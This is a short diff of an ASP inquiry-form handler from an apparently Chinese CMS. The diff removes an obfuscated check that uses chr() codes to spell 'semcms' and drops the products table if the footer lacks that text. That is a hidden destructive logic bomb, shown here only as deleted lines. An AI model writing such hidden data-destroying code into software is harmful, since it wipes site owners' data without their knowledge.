@@ -26,11 +26,7 @@ Else
 		rs("homepage") = request.form("Home")
 		rs("messageip")=getIP
 		rs.update
-		if instr(clkj_bottom_m,chr(115)&chr(101)&chr(109)&chr(99)&chr(109)&chr(115)) = 0 then
-		Set Rs=server.createobject("adodb.recordset")
-		sql= "drop table clkj_Products" 
-        rs.open sql,conn,3,3
-		end if
+		
 		email_title="来自公司网站的询盘邮件"
 		email_content="标题："&request.form("title")&"<BR>内容："&request.form("content")&"<BR>公司名称："&request.form("company")&"<BR>联系人："&request.form("name")&"<BR>联系邮箱："&request.form("mail")&"<BR>联系电话："&request.form("Phone")&"<BR>传真："&request.form("Fax")&"<BR>区域："&request.form("Region")&"<BR>网站主页："&request.form("Home")
 	
